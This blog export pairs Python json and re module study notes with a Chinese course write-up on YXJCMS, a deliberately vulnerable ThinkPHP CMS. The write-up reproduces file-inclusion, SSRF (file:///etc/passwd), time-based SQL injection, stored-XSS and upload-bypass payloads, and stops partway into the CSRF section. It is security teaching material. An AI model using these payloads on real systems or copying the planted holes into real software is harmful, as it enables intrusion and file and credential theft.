<h4 id="五、json-—-JSON-编码和解码器"><a href="#五、json-—-JSON-编码和解码器" class="headerlink" title="五、json — JSON 编码和解码器"></a>五、json — JSON 编码和解码器</h4><p>json模块官方文档：<a href="https://docs.python.org/zh-cn/3/library/json.html#module-json" target="_blank" rel="noopener">https://docs.python.org/zh-cn/3/library/json.html#module-json</a></p>
<p>JSON 类型转换Python 类型的对应关系：<br><img src="/2019/07/17/Python常用模块/2019071715493289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p> Python 类型转换 JSON 类型的对应关系：<br><img src="/2019/07/17/Python常用模块/20190717155051629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>json 模块中常用的函数和类的功能如下：</p>
<ul>
<li><strong>json.dump(obj, fp, <em>, skipkeys=False, ensure_ascii=True, check_circular=True, allow_nan=True, cls=None, indent=None, separators=None, default=None, sort_keys=False, \</em>*kw)</strong>：将 obj 对象转换成 JSON 字符串输出到 fp 流中，fp 是一个支持 write() 方法的类文件对象。</li>
<li><strong>json.dumps(obj, <em>, skipkeys=False, ensure_ascii=True, check_circular=True, allow_nan= True, cls=None, indent=None, separators=None, default=None, sort_keys=False, \</em>*kw)</strong>：将 obj 对象转换为 JSON 字符串，并返回该JSON 字符串。</li>
<li><strong>json.load(fp, <em>, cls=None, object_hook=None, parse_float=None, parse_int=None, parse_constant=None, object_pairs_hook=None, \</em>*kw)</strong>：从 fp 流读取 JSON 字符串，将其恢复成 JSON 对象，其中 fp 是一个支持 write() 方法的类文件对象。</li>
<li><strong>json.loads(s, <em>, encoding=None, cls=None, object_hook=None, parse_float=None, parse_int=None, parse_constant=None, object_pairs_hook=None, \</em>*kw)</strong>：将 JSON 字符串 s 恢复成 JSON 对象。<br><img src="/2019/07/17/Python常用模块/20190717155333993.png" alt="在这里插入图片描述"></li>
</ul>
<p>dumps() 和 dump() 函数的 encode 操作（将 Python 对象转换成 JSON 字符串）：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="comment"># 将Python对象转JSON字符串（元组会当成数组）</span></span><br><span class="line">s = json.dumps([<span class="string">'yeeku'</span>, &#123;<span class="string">'favorite'</span>: (<span class="string">'coding'</span>, <span class="literal">None</span>, <span class="string">'game'</span>, <span class="number">25</span>)&#125;])</span><br><span class="line">print(s) <span class="comment"># ["yeeku", &#123;"favorite": ["coding", null, "game", 25]&#125;]</span></span><br><span class="line"><span class="comment"># 简单的Python字符串转JSON</span></span><br><span class="line">s2 = json.dumps(<span class="string">"\"foo\bar"</span>)</span><br><span class="line">print(s2) <span class="comment">#"\"foo\bar"</span></span><br><span class="line"><span class="comment"># 简单的Python字符串转JSON</span></span><br><span class="line">s3 = json.dumps(<span class="string">'\\'</span>)</span><br><span class="line">print(s3) <span class="comment">#"\\"</span></span><br><span class="line"><span class="comment"># Python的dict对象转JSON，并对key排序</span></span><br><span class="line">s4 = json.dumps(&#123;<span class="string">"c"</span>: <span class="number">0</span>, <span class="string">"b"</span>: <span class="number">0</span>, <span class="string">"a"</span>: <span class="number">0</span>&#125;, sort_keys=<span class="literal">True</span>)</span><br><span class="line">print(s4) <span class="comment">#&#123;"a": 0, "b": 0, "c": 0&#125;</span></span><br><span class="line"><span class="comment"># 将Python列表转JSON，</span></span><br><span class="line"><span class="comment"># 并指定JSON分隔符：逗号和冒号之后没有空格（默认有空格）</span></span><br><span class="line">s5 = json.dumps([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, &#123;<span class="string">'x'</span>: <span class="number">5</span>, <span class="string">'y'</span>: <span class="number">7</span>&#125;], separators=(<span class="string">','</span>, <span class="string">':'</span>))</span><br><span class="line"><span class="comment"># 输出的JSON字符串中逗号和冒号之后没有空格</span></span><br><span class="line">print(s5) <span class="comment"># '[1,2,3,&#123;"4":5,"6":7&#125;]'</span></span><br><span class="line"><span class="comment"># 指定indent为4，意味着转换的JSON字符串有缩进</span></span><br><span class="line">s6 = json.dumps(&#123;<span class="string">'Python'</span>: <span class="number">5</span>, <span class="string">'Kotlin'</span>: <span class="number">7</span>&#125;, sort_keys=<span class="literal">True</span>, indent=<span class="number">4</span>)</span><br><span class="line">print(s6)</span><br><span class="line"><span class="comment"># 使用JSONEncoder的encode方法将Python转JSON</span></span><br><span class="line">s7 = json.JSONEncoder().encode(&#123;<span class="string">"names"</span>: (<span class="string">"孙悟空"</span>, <span class="string">"齐天大圣"</span>)&#125;)</span><br><span class="line">print(s7) <span class="comment"># &#123;"names": ["\u5b59\u609f\u7a7a", "\u9f50\u5929\u5927\u5723"]&#125;</span></span><br><span class="line">f = open(<span class="string">'a.json'</span>, <span class="string">'w'</span>)</span><br><span class="line"><span class="comment"># 使用dump()函数将转换得到JSON字符串输出到文件</span></span><br><span class="line">json.dump([<span class="string">'Kotlin'</span>, &#123;<span class="string">'Python'</span>: <span class="string">'excellent'</span>&#125;], f)</span><br></pre></td></tr></table></figure></p>
<p> loads() 和 load() 函数的 decode 操作（将 JSON 字符串转换成 Python 对象）：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="comment"># 将JSON字符串恢复成Python列表</span></span><br><span class="line">result1 = json.loads(<span class="string">'["yeeku", &#123;"favorite": ["coding", null, "game", 25]&#125;]'</span>)</span><br><span class="line">print(result1) <span class="comment"># ['yeeku', &#123;'favorite': ['coding', None, 'game', 25]&#125;]</span></span><br><span class="line"><span class="comment"># 将JSON字符串恢复成Python字符串</span></span><br><span class="line">result2 = json.loads(<span class="string">'"\\"foo\\"bar"'</span>)</span><br><span class="line">print(result2) <span class="comment"># "foo"bar</span></span><br><span class="line"><span class="comment"># 定义一个自定义的转化函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">as_complex</span><span class="params">(dct)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'__complex__'</span> <span class="keyword">in</span> dct:</span><br><span class="line">        <span class="keyword">return</span> complex(dct[<span class="string">'real'</span>], dct[<span class="string">'imag'</span>])</span><br><span class="line">    <span class="keyword">return</span> dct</span><br><span class="line"><span class="comment"># 使用自定义的恢复函数</span></span><br><span class="line"><span class="comment"># 自定义回复函数将real数据转成复数的实部，将imag转成复数的虚部</span></span><br><span class="line">result3 = json.loads(<span class="string">'&#123;"__complex__": true, "real": 1, "imag": 2&#125;'</span>,\</span><br><span class="line">    object_hook=as_complex)</span><br><span class="line">print(result3) <span class="comment"># (1+2j)</span></span><br><span class="line">f = open(<span class="string">'a.json'</span>)</span><br><span class="line"><span class="comment"># 从文件流恢复JSON列表</span></span><br><span class="line">result4 = json.load(f)</span><br><span class="line">print(result4) <span class="comment"># ['Kotlin', &#123;'Python': 'excellent'&#125;]</span></span><br></pre></td></tr></table></figure>
<p><br></p>
<h4 id="六、re-—-正则表达式操作"><a href="#六、re-—-正则表达式操作" class="headerlink" title="六、re — 正则表达式操作"></a>六、re — 正则表达式操作</h4><p>re模块官方文档：<a href="https://docs.python.org/zh-cn/3/library/re.html#module-re" target="_blank" rel="noopener">https://docs.python.org/zh-cn/3/library/re.html#module-re</a></p>
<ul>
<li><strong>re.compile(pattern, flags=0)</strong>：该函数用于将正则表达式字符串编译成 _sre.SRE_Pattern 对象，该对象代表了正则表达式编译之后在内存中的对象，它可以缓存并复用正则表达式字符串。如果程序需要多次使用同一个正则表达式字符串，则可考虑先编译它。</li>
<li><strong>re.match(pattern, string, flags=0)</strong>：尝试从字符串的开始位置来匹配正则表达式，如果从开始位置匹配不成功，match() 函数就返回 None 。其中 pattern 参数代表正则表达式；string 代表被匹配的字符串；flags 则代表正则表达式的匹配旗标。该函数返回 _sre.SRE_Match 对象，该对象包含的 span(n) 方法用于获取第 n+1 个组的匹配位置，group(n) 方法用于获取第 n+1 个组所匹配的子串</li>
<li><strong>re.search(pattern, string, flags=0)</strong>：扫描整个字符串，并返回字符串中第一处匹配 pattern 的匹配对象。其中 pattern 参数代表正则表达式；string 代表被匹配的字符串；flags 则代表正则表达式的匹配旗标。该函数也返回 _sre.SRE_Match 对象。</li>
</ul>
<p>match() 与 search() 的区别在于，match() 必须从字符串开始处就匹配，但 search() 可以搜索整个字符串。例如如下程序：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">m1 = re.match(<span class="string">'www'</span>, <span class="string">'www.lethe.site'</span>)<span class="comment"># 开始位置可以匹配</span></span><br><span class="line">print(m1.span())  <span class="comment"># span返回匹配的位置</span></span><br><span class="line">print(m1.group()) <span class="comment"># group返回匹配的组</span></span><br><span class="line">print(re.match(<span class="string">'lethe'</span>, <span class="string">'www.lethe.site'</span>)) <span class="comment"># 开始位置匹配不到，返回None</span></span><br><span class="line">m2 = re.search(<span class="string">'www'</span>, <span class="string">'www.lethe.site'</span>) <span class="comment"># 开始位置可以匹配</span></span><br><span class="line">print(m2.span())</span><br><span class="line">print(m2.group())</span><br><span class="line">m3 = re.search(<span class="string">'lethe'</span>, <span class="string">'www.lethe.site'</span>) <span class="comment"># 中间位置可以匹配，返回Match对象</span></span><br><span class="line">print(m3.span())</span><br><span class="line">print(m3.group())</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">(<span class="number">0</span>, <span class="number">3</span>)</span><br><span class="line">www</span><br><span class="line"><span class="literal">None</span></span><br><span class="line">(<span class="number">0</span>, <span class="number">3</span>)</span><br><span class="line">www</span><br><span class="line">(<span class="number">4</span>, <span class="number">9</span>)</span><br><span class="line">lethe</span><br></pre></td></tr></table></figure></p>
<ul>
<li><strong>re.findall(pattern, string, flags=0)</strong>：扫描整个字符串，并返回字符串中所有匹配 pattern 的子串组成的<strong>列表</strong>。其中 pattern 参数代表正则表达式；string 代表被匹配的宇符串；flags 则代表正则表达式的匹配旗标。</li>
<li><strong>re.finditer(pattern, string, flags=0)</strong>：扫描整个字符串，并返回字符串中所有匹配 pattern 的子串组成的<strong>迭代器</strong>，迭代器的元素是 _sre.SRE_Match 对象。其中 pattern 参数代表正则表达式；string 代表被匹配的字符串；flags 则代表正则表达式的匹配旗标。</li>
</ul>
<p>对比 findall()、finditer() 和 search() 函数，search() 只返回字符串中第一处匹配 pattern 的子串；而 findall() 和 finditer() 则返回字符串中所有匹配 pattern 的子串。</p>
<ul>
<li><strong>re.fullmatch(pattem, string, flags=0)</strong>：该函数要求整个字符串能匹配 pattern，如果匹配则返回包含匹配信息的 _sre.SRE_Match 对象；否则返回 None。</li>
<li><strong>re.sub(pattern, repl, string, count=0, flags=0)</strong>：该函数用于将 string 字符串中所有匹配 pattern 的内容替换成 repl；repl 既可是被替换的字符串，也可是一个函数。count 参数控制最多替换多少次，如果指定 count 为 0 ，则表示全部首换。</li>
<li><strong>re.split(pattem, string, maxsplit=0, flags=0)</strong>：使用 pattern 对 string 进行分割，该函数返回分割得到的多个子串组成的列表。其中 maxsplit 参数控制最多分割几次</li>
<li><strong>re.purge()</strong>：清除正则表达式缓存。</li>
<li><strong>re.escape(pattern)</strong>：对模式中除 ASCII 字符、数值、下画线（_）之外的其他字符进行转义。</li>
</ul>
<p>re 模块中的 Match 对象（其具体类型为 _sre.SRE_Match）则是 match()、search() 方法的返回值，该对象中包含了详细的正则表达式匹配信息，包括正则表达式匹配的位置、正则表达式所匹配的子串。</p>
<p>sre.SRE_Match 对象包含了如下方法或属性：</p>
<ul>
<li><strong>match.group([group1,…])</strong>：获取该匹配对象中指定组所匹配的字符串。</li>
<li><strong>match.<strong>getitem</strong>(g)</strong>：这是 match.group(g) 的简化写法。由于 match 对象提供了 <strong>getitem</strong>() 方法，因此程序可使用 match[g] 来代替 match.group(g)。</li>
<li><strong>match.groups(default=None)</strong>：返回 match 对象中所有组所匹配的字符串组成的元组。</li>
<li><strong>match.groupdict(default= None)</strong>：返回 match 对象中所有组所匹配的字符串组成的字典。</li>
<li><strong>match.start([group])</strong>：获取该匹配对象中指定组所匹配的字符串的开始位置。</li>
<li><strong>match.end([group])</strong>：获取该匹配对象中指定组所匹配的宇符串的结束位置。</li>
<li><strong>match.span([group])</strong>：获取该匹配对象中指定组所匹配的字符串的开始位置和结束位置。该方法相当于同时返回 start() 和 end() 方法的返回值。</li>
</ul>
]]></content>
      <categories>
        <category>Study Notes</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>YXJCMS：一个集成十种漏洞的Web应用系统</title>
    <url>/2020/06/09/YXJCMS/</url>
    <content><![CDATA[<h1 id="1-开发过程"><a href="#1-开发过程" class="headerlink" title="1 开发过程"></a>1 开发过程</h1><h2 id="1-1-需求分析"><a href="#1-1-需求分析" class="headerlink" title="1.1 需求分析"></a>1.1 需求分析</h2><p>基于Linux系统，使用Docker容器，并从PHP、Java、Python中选择一门语言并应用开发框架进行开发。所开发的Web应用系统需内置典型的Web漏洞，其中必须包含：</p>
<ul>
<li><p>SQL注入</p>
</li>
<li><p>XSS</p>
</li>
<li><p>文件上传</p>
</li>
<li><p>文件包含</p>
</li>
<li><p>命令执行</p>
</li>
<li><p>XXE</p>
</li>
<li><p>反序列化</p>
</li>
</ul>
<p>部署方式使用Docker容器进行一键部署，方便环境的迁移与搭建，并需要完成对内置典型漏洞的攻击过程。最后还需要对漏洞页面进行修复，并进行验证。</p>
<p>根据需求，进行如下分析：</p>
<p>（1）目前市面上使用PHP进行开发的Web应用系统占据很大一部分，并且国人开发的PHP开发框架ThinkPHP上手简单、文档详细，也被使用的越来越广泛。</p>
<p>（2）除此之外，使用PHP语言来进行内置漏洞的开发时，可以最大程度上覆盖所有类型的漏洞，实现代码也较为经典。而如果使用Java或者Python语言，由于语言本身的特性，对于某些漏洞可能会比较难以实现。</p>
<p>（3）本次Web应用系统包含Web服务、数据库服务等不止一种服务，在使用Docker进行部署时，可以使用Docker Compose，避免对每一个微服务单独编写dockerfile和进行docker build操作。</p>
<h2 id="1-2-系统架构"><a href="#1-2-系统架构" class="headerlink" title="1.2 系统架构"></a>1.2 系统架构</h2><p>由需求分析可知，我们需要选择PHP以及ThinkPHP进行本次课程设计的开发，因此开发工具选取JetBrains旗下的PHPStorm作为IDE，基于ThinkPHP5在YXJCMS的基础上进行开发。</p>
<p>网站架构如下：</p>
<p>（1）整个网站分为前台展示、用户后台和管理员后台，前台功能由首页、新闻中心、关于我们、加入我们四个模块。</p>
<p>（2）用户可使用前台的注册、登录功能进入到用户管理界面，在用户管理界面除了可以对个人信息进行修改，还具有在线投稿功能，向管理员发送稿件，经审核可以发表在网站前台。</p>
<p>（3）管理员后台具有系统配置、权限管理、内容管理、内容设置、会员管理几大功能模块，用来对整个Web应用服务进行统一的管理与设置。</p>
<h2 id="1-3-漏洞设计"><a href="#1-3-漏洞设计" class="headerlink" title="1.3 漏洞设计"></a>1.3 漏洞设计</h2><p>由于本Web站点具有实际的使用功能，因此考虑将各经典漏洞尽量融合于实际功能点，在满足正常需求的情况下，设计所要求的漏洞，思路如下：</p>
<p>（1）文件包含漏洞</p>
<p>在“关于我们”界面为了引入其他php文件中的信息使用了文件包含操作，直接通过GET传参的方式由file参数传入要包含的文件名，但是由于没有限制包含的文件名，从而可以使攻击者任意包含文件。</p>
<p>（2）SSRF</p>
<p>需求在于关于我们页面中需要引入作者博客页面，因此使用curl语句对本站点以外的web服务发起了请求，同样是为对GET请求中的url参数进行严格过滤，导致攻击者可以任意传入url参数进行SSRF攻击，可以造成任意文件读取、内网端口扫描等危害。</p>
<p>（3）XXE</p>
<p>我们知道实际上doc文件内含了许多xml文件，因此同样可以造成XXE文件。在本系统中，该漏洞存在于“简历上传”功能处，用户可以上传doc文件，而系统在未禁用外部实体的情况下对xml文档进行解析，从而造成XXE漏洞，攻击者可读取任意文件。</p>
<p>（4）弱口令</p>
<p>在渗透测试的过程中，弱口令是非常常见的漏洞之一，且其利用简单，危害大，因为往往管理员后台都会有一些敏感功能。因此在本系统中，管理员后台使用admin/admin的弱口令。</p>
<p>（5）SQL注入</p>
<p>SQL注入漏洞通常存在于对数据库的查询中，本系统的SQL注入漏洞位于用户登陆后，在查看稿件的功能处，存在对数据库的查询操作，其id参数未进行任何过滤，导致可以进行SQL注入。</p>
<p>（6）文件上传漏洞</p>
<p>本系统的文件上传漏洞为了更贴近真实，不存在直接漏洞，而是配合其他漏洞手段先获取管理员后台，而在管理员后台可以设置运行上传的文件后缀，这样就可以造成任意文件上传漏洞了，并且可以直接getshell，思路是比较真实的，危害也是比较大的。</p>
<p>（7）存储型XSS</p>
<p>存储型XSS危害较大，但是一般需要管理员进行交互，让管理员能够看到攻击者构造的XSS<br>Payload。本系统的XSS漏洞位于用户后台的“在线投稿”功能，通过在稿件中构造Payload并投稿，可以在管理员审核稿件时触发，从而获取管理员账号的Cookie等信息。</p>
<p>（8）CSRF</p>
<p>本系统的CSRF漏洞存在于管理员后台，在系统管理员使用“添加管理员”功能时，提交的表单没有进行Token的验证，这样就会时攻击者能够构造CSRF表单，然后通过诱导管理员点击的方式，任意添加管理员账号。</p>
<p>（9）命令注入</p>
<p>命令注入漏洞位于管理员后台的服务器状态功能，这里可以输入IP地址，如127.0.0.1，提交后会对该IP进行Ping命令并返回结果，但是由于没有进行任何过滤，所以攻击者可以通过拼接闭合任意执行命令。</p>
<p>（10）反序列化</p>
<p>由于反序列化漏洞不好直接结合到此次站点的功能中，所以我在管理员后台中单独添加了一个演示页面，可以对传入的payload进行反序列化，而未进行任何检查，从而造成反序列化漏洞。</p>
<h2 id="1-4-页面展示"><a href="#1-4-页面展示" class="headerlink" title="1.4 页面展示"></a>1.4 页面展示</h2><p>（1）前台首页</p>
<p><img src="/2020/06/09/YXJCMS/9217fdd8e3461198b180bdc951ba83e1.png" alt></p>
<p>（2）用户后台</p>
<p><img src="/2020/06/09/YXJCMS/bbac9f2855044e0f493d3ac4b636e323.png" alt></p>
<p>（3）管理员后台</p>
<p><img src="/2020/06/09/YXJCMS/0c8b30af100ce780c3a95b6dc82233ce.png" alt></p>
<h1 id="2-漏洞证明"><a href="#2-漏洞证明" class="headerlink" title="2 漏洞证明"></a>2 漏洞证明</h1><h2 id="2-1-文件包含漏洞"><a href="#2-1-文件包含漏洞" class="headerlink" title="2.1 文件包含漏洞"></a>2.1 文件包含漏洞</h2><h3 id="2-1-1-漏洞复现"><a href="#2-1-1-漏洞复现" class="headerlink" title="2.1.1 漏洞复现"></a>2.1.1 漏洞复现</h3><p>文件包含漏洞位于首页的关于我们页面，可以看到url中出现file=about.php参数，即在该页面中包含了about.php：</p>
<p><img src="/2020/06/09/YXJCMS/b7e70bae97fbdb95a75a01d0f34e13c4.png" alt></p>
<p>我们尝试进行文件包含攻击，构造payload：?file=/etc/passwd</p>
<p><img src="/2020/06/09/YXJCMS/cdec4bc911b956519069825f61e86238.png" alt></p>
<p>可以看到当我们将包含的文件名改为/etc/passwd后，原来的信息不能正常显示了，但是成功回显了/etc/passwd的文件内容，也就意味着包含了该文件内容。</p>
<p>如果想包含PHP文件并能看到文件中的内容的话，就不能直接包含文件名，而是需要利用PHP伪协议。如我们要读取about.php的内容，可以构造payload如下：?file=php://filter/convert.base64-encode/resource=about.php</p>
<p><img src="/2020/06/09/YXJCMS/561db889e1a1d99b4122f3da592ce191.png" alt></p>
<p>提交payload后回显了一段base64，我们进行base64解码后得到about.php的内容：</p>
<p><img src="/2020/06/09/YXJCMS/1c86451c02abbea9b317e8bed0e9e759.png" alt></p>
<h3 id="2-1-2-代码分析"><a href="#2-1-2-代码分析" class="headerlink" title="2.1.2 代码分析"></a>2.1.2 代码分析</h3><p>漏洞代码位于MyCMS\src\application\about\controller\Index.php的index函数中：</p>
<p><img src="/2020/06/09/YXJCMS/6822ea256d8405278381209d3ee585b1.png" alt></p>
<p>可以看到使用include语句进行文件包含时，没有进行任何的过滤与限制，导致\$file变量可控，攻击者可以通过传入该变量的值任意包含文件。</p>
<h2 id="2-2-SSRF"><a href="#2-2-SSRF" class="headerlink" title="2.2 SSRF"></a>2.2 SSRF</h2><h3 id="2-2-1-漏洞复现"><a href="#2-2-1-漏洞复现" class="headerlink" title="2.2.1 漏洞复现"></a>2.2.1 漏洞复现</h3><p><img src="/2020/06/09/YXJCMS/c033397c2c9d1bdd4b380700cce42780.png" alt></p>
<p>在关于我们页面中点击“作者博客”，可以看到链接中加入了url参数，如下：?url=<a href="https://lethe.site/about/，并且显示了该网址的内容。">https://lethe.site/about/，并且显示了该网址的内容。</a></p>
<p><img src="/2020/06/09/YXJCMS/5ee993daf148c0e2b492dadc7559cb29.png" alt></p>
<p>可以初步判断存在SSRF，即服务端会请求url中传递的链接。但是攻击者在利用时除了http协议，可以使用file协议读取服务器上的任意文件，如使用如下payload：?url=file:///etc/passwd</p>
<p><img src="/2020/06/09/YXJCMS/b0436d25e37a36045bc7d56e4fb850f6.png" alt></p>
<p>可以看到成功通过SSRF漏洞读取了/etc/passwd的内容。</p>
<h3 id="2-2-2-代码分析"><a href="#2-2-2-代码分析" class="headerlink" title="2.2.2 代码分析"></a>2.2.2 代码分析</h3><p>漏洞代码位于MyCMS\src\application\about\controller\Index.php的blog函数中：</p>
<p><img src="/2020/06/09/YXJCMS/1e2fdd02e611ec85327ccfff20e5f8d3.png" alt></p>
<p>url参数没有进行任何的过滤与限制操作，直接传入了curl_exec()中进行执行，导致了\$url对攻击者可控，攻击者可以通过http、file、gopher等协议进行SSRF攻击，造成任意文件读取、内网端口扫描等攻击。</p>
<h2 id="2-3-XXE"><a href="#2-3-XXE" class="headerlink" title="2.3 XXE"></a>2.3 XXE</h2><h3 id="2-3-1-漏洞复现"><a href="#2-3-1-漏洞复现" class="headerlink" title="2.3.1 漏洞复现"></a>2.3.1 漏洞复现</h3><p>XXE漏洞存在于首页加入我们页面中的提交简历功能：</p>
<p><img src="/2020/06/09/YXJCMS/e3124120e30493abba7714b94af106d2.png" alt></p>
<p>这里上传的简历文件限制只能为docx格式，但是通过测试可以发现服务端对会读取docx文件的docProps目录下的core.xml读取xml，所以把docx文件解压后在core.xml里构造payload：</p>
<p><img src="/2020/06/09/YXJCMS/b42b5f6202edfce2d5e0f4ec91109442.png" alt></p>
<p>然后在使用zip命令压缩为docx文件：</p>
<p><img src="/2020/06/09/YXJCMS/9d394cbecd77983418ae389ab1bbdded.png" alt></p>
<p>然后上传我们构造的xxe.docx文件到服务端：</p>
<p><img src="/2020/06/09/YXJCMS/99e602afd82e23df62b3ae01129b619e.png" alt></p>
<p>服务器成功解析我们构造的payload并读取了/etc/passwd文件。</p>
<h3 id="2-3-2-代码分析"><a href="#2-3-2-代码分析" class="headerlink" title="2.3.2 代码分析"></a>2.3.2 代码分析</h3><p>漏洞代码位于MyCMS\src\application\joinus\controller\Index.php中：</p>
<p><img src="/2020/06/09/YXJCMS/418e890fa08df340cdd534416c0cd825.png" alt></p>
<p>代码中接收上传的文件后，会对docx进行解析，会读取docPorps/core.xml中的内容，并且把//dc:title回显，如果解析过程中出错，则判断不是一个docx文件，但是代码中没有进行任何过滤，也没有对外部实体的引用进行限制，这就导致了攻击者可以构造恶意docx文件从而进行XXE攻击。</p>
<h2 id="2-4-弱口令"><a href="#2-4-弱口令" class="headerlink" title="2.4 弱口令"></a>2.4 弱口令</h2><h3 id="2-4-1-漏洞复现"><a href="#2-4-1-漏洞复现" class="headerlink" title="2.4.1 漏洞复现"></a>2.4.1 漏洞复现</h3><p>弱口令是真实环境下最常见的漏洞之一，因此在本Web应用系统的管理员后台处设置了弱口令，即用户名和密码均为admin，攻击者可以通过手工测试或者爆破的方式获取用户名和密码，从而登录后台：</p>
<p><img src="/2020/06/09/YXJCMS/019f9b911214ed801d05a8da40b32b80.png" alt></p>
<p>成功登陆后台：</p>
<p><img src="/2020/06/09/YXJCMS/784ebee8008044b1341625379511f3a5.png" alt></p>
<h2 id="2-5-存储型XSS"><a href="#2-5-存储型XSS" class="headerlink" title="2.5 存储型XSS"></a>2.5 存储型XSS</h2><h3 id="2-5-1-漏洞复现"><a href="#2-5-1-漏洞复现" class="headerlink" title="2.5.1 漏洞复现"></a>2.5.1 漏洞复现</h3><p>存储型XSS需要进行用户登录，在用户管理界面中有在线投稿功能，管理员会对稿件的内容进行审核，因此我们可以在标题处插入XSS的payload如：\&lt;script>alert(‘xss’)\&lt;/script>，然后进行投稿：</p>
<p><img src="/2020/06/09/YXJCMS/d2e769478a8cf233b86608c53d7678a8.png" alt></p>
<p>提交后等待管理员审核即可。</p>
<p><img src="/2020/06/09/YXJCMS/abb30153f5c8e54f76bfdc34175cd5a0.png" alt></p>
<p>然后等待管理员对稿件进行审核，即可触发xss如下：</p>
<p><img src="/2020/06/09/YXJCMS/c1b684bebe996a78694b279dc3e0af2c.png" alt></p>
<p>攻击者通过构造payload，可以利用存储型xss获取管理员用户的cookie，从而以管理员的身份进行登录，危害较大。</p>
<h3 id="2-5-2-代码分析"><a href="#2-5-2-代码分析" class="headerlink" title="2.5.2 代码分析"></a>2.5.2 代码分析</h3><p>漏洞位于 YXJCMS\application\member\controller\Content.php的publish()函数：</p>
<p><img src="/2020/06/09/YXJCMS/e163c9fc49faa96646ba4aa64688fd4b.png" alt></p>
<p><img src="/2020/06/09/YXJCMS/4c5c2f660203544693c99ef749f2eeb7.png" alt></p>
<p>将用户提交上来的投稿表单，没有进行任何的过滤与转义，就直接存入数据库中了，这样导致管理员在审核稿件的时候直接能够看到原始的xss语句，从而触发payload。</p>
<h2 id="2-6-SQL注入"><a href="#2-6-SQL注入" class="headerlink" title="2.6 SQL注入"></a>2.6 SQL注入</h2><h3 id="2-6-1-漏洞复现"><a href="#2-6-1-漏洞复现" class="headerlink" title="2.6.1 漏洞复现"></a>2.6.1 漏洞复现</h3><p>漏洞位于用户后台的“我的稿件”功能，点击下图的“编辑”：</p>
<p><img src="/2020/06/09/YXJCMS/086ca23bd50303fb5a71d8ee545c4430.png" alt></p>
<p>可以看到之前提交的稿件，并且url中出现了id=2的参数：</p>
<p><img src="/2020/06/09/YXJCMS/cd0b194dda1a7edfb843e27d5ef68ff5.png" alt></p>
<p>我们先通过payload：?id=1 and sleep(5)%23，发现页面延时了5秒，判断存在SQL注入：</p>
<p><img src="/2020/06/09/YXJCMS/ec6dcfd1993f7015b85a056dff660d0f.png" alt></p>
<p>直接使用SQLMAP自动化工具进行注入(需要加上cookie)：</p>
<p><img src="/2020/06/09/YXJCMS/72b78e8a2736aa59971371cea6cf72f5.png" alt></p>
<p>成功注出结果：</p>
<p><img src="/2020/06/09/YXJCMS/2d00da8549774f1a7a2c1b20a7b50e6e.png" alt></p>
<h3 id="2-6-2-代码分析"><a href="#2-6-2-代码分析" class="headerlink" title="2.6.2 代码分析"></a>2.6.2 代码分析</h3><p>漏洞代码位于YXJCMS\application\member\controller\Content.php 的edit函数中：</p>
<p><img src="/2020/06/09/YXJCMS/c26fcbd94e81a7c0e90d6f12a87d20f9.png" alt></p>
<p>在进行数据库操作的时候，直接使用了sql语句拼接的方式将参数\$id拼接了进去，这样攻击者就可以通过构造\$id参数来闭合前面的sql语句，而加上自己的恶意语句，从而造成SQL注入漏洞。</p>
<h2 id="2-7-文件上传漏洞"><a href="#2-7-文件上传漏洞" class="headerlink" title="2.7 文件上传漏洞"></a>2.7 文件上传漏洞</h2><h3 id="2-7-1-漏洞复现"><a href="#2-7-1-漏洞复现" class="headerlink" title="2.7.1 漏洞复现"></a>2.7.1 漏洞复现</h3><p>本系统中的文件上传漏洞，不能直接利用，需要先用XSS、SQL注入、CSRF等其他漏洞获取管理员后台登录权限，然后修改运行上传的后缀（加上php）:</p>
<p><img src="/2020/06/09/YXJCMS/d3235336590ef598323ebba75ccf6392.png" alt></p>
<p>然后在用户后台的“头像上传”功能处进行上传，上传时还要采取一定的绕过方式，即Content-type为：image/png，并在文件前面加上GIF89a：</p>
<p><img src="/2020/06/09/YXJCMS/1e99f7dfa86728ebf5415fdd4b8e7342.png" alt></p>
<p>成功上传了php文件，访问文件路径看到shell.php被成功执行：</p>
<p><img src="/2020/06/09/YXJCMS/357090fbd4046597f6df0a0398a7b90c.png" alt></p>
<p>这里使用phpinfo进行测试，实际上攻击者可以通过上传木马文件从而直接获得服务器的控制权。</p>
<h3 id="2-7-2-代码分析"><a href="#2-7-2-代码分析" class="headerlink" title="2.7.2 代码分析"></a>2.7.2 代码分析</h3><p>漏洞代码位于YXJCMS\application\attachment\controller\Upload.php：</p>
<p><img src="/2020/06/09/YXJCMS/f311ce63e7be30c57bb20688e1240b85.png" alt></p>
<p>可以看到实际上是对上传的文件进行了过滤的，但是存在一定的逻辑漏洞，即若攻击者能够登录管理员后台，就可以在“运行上传文件”处添加上本身不允许的类型（如php）从而造成漏洞，防御时应该采取任何情况下都不能上传php文件的方式，即使添加了运行项，也无法上传成功。</p>
<h2 id="2-8-CSRF"><a href="#2-8-CSRF" class="headerlink" title="2.8 CSRF"></a>2.8 CSRF</h2><h3 id="2-8-1-漏洞复现"><a href="#2-8-1-漏洞复现" class="headerlink" title="2.8.1 漏洞复现"></a>2.8.1 漏洞复现</h3><p>CSRF漏洞位于管理员后台的“添加管理员”功能，点击添加管理员并抓包：</p>
<p><img src="/2020/06/09/YXJCMS/dbf30986c8c13ffa7d0556858f820086.png" alt></p>
<p>然后利用BurpSuite生成CSRF POC：</p>
<p><img src="/2020/06/09/YXJCMS/2b9c25db7da3df31383c94c1ad95948a.png" alt="在这里插入图片描述"></p>
